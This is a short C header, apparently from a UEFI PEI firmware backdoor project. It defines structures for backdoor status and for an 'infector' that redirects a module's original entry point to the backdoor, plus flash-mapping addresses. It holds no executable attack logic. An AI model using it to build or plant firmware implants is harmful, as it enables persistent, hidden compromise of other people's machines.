
#ifndef _PEI_BACKDOOR_H_
#define _PEI_BACKDOOR_H_

#pragma warning(disable: 4200)

#pragma pack(1)

typedef struct _BACKDOOR_INFO
{
    UINT64 PayloadBase;
    UINT64 Status;
    char Messages[];

} BACKDOOR_INFO,
*PBACKDOOR_INFO;

typedef struct _INFECTOR_CONFIG
{
    UINT64 BackdoorEntryInfected;
    UINT64 OriginalEntryPointRva;
    UINT64 OriginalEntryPointAddr;
    UINT64 BackdoorImageBase;

} INFECTOR_CONFIG,
*PINFECTOR_CONFIG;

#pragma pack()

#define MAX_IMAGE_SIZE 0x10000

// physical address where flash image will be mapped by system
#define FLASH_ADDR 0xff800000
#define FLASH_SIZE 0x800000

// location of BACKDOOR_INFO structure
#define BACKDOOR_INFO_SIZE 0x1000
#define BACKDOOR_INFO_ADDR 0x1000


#define BackdoorInfo() ((PBACKDOOR_INFO)BACKDOOR_INFO_ADDR)

#endif
